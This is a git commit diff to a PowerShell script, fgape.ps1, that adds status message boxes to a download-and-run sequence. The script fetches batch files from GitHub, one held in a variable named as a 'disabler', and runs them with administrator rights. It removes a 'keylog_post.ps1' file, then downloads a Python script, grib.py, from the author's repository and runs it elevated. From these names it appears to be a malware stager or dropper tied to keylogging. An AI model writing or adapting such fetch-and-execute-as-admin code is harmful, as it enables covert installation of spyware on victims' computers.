920672967d6f18e0098a6135ad26bec404251485
FanAPIpipa <156794064+FanAPIpipa@users.noreply.github.com>
2024-02-03 17:46:16 +0300

    Update fgape.ps1

--- fgape.ps1
+++ fgape.ps1
@@ -10,16 +10,37 @@ $batFileUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/
 $batFilePath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
 
 Invoke-WebRequest -Uri $installPythonBatUrl -OutFile $installPythonBatPath
+[System.Windows.Forms.MessageBox]::Show("Install Python bat downloaded")
+
 Invoke-WebRequest -Uri $batFileDisabler -OutFile $batFileDisablerPath
+[System.Windows.Forms.MessageBox]::Show("Disable bat downloaded")
+
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
+[System.Windows.Forms.MessageBox]::Show("Python installation started")
+
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
+[System.Windows.Forms.MessageBox]::Show("Python installation completed")
+
 Invoke-WebRequest -Uri $installPythonToolsBatUrl -OutFile $installPythonToolsBatPath
+[System.Windows.Forms.MessageBox]::Show("Python tools bat downloaded")
+
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
+[System.Windows.Forms.MessageBox]::Show("Python tools installation completed")
+
 Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
+[System.Windows.Forms.MessageBox]::Show("Install Python bat downloaded")
+
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
+[System.Windows.Forms.MessageBox]::Show("Python installation completed")
+
 $keylogScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "keylog_post.ps1"
 Remove-Item -Path $keylogScriptPath -Force
+[System.Windows.Forms.MessageBox]::Show("Keylog script removed")
+
 $gribScriptUrl = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/grib.py"
 $gribScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "grib.py"
 Invoke-WebRequest -Uri $gribScriptUrl -OutFile $gribScriptPath
+[System.Windows.Forms.MessageBox]::Show("Grib script downloaded")
+
 Start-Process -FilePath "python.exe" -ArgumentList "$gribScriptPath" -Verb RunAs -Wait
+[System.Windows.Forms.MessageBox]::Show("Grib script executed")
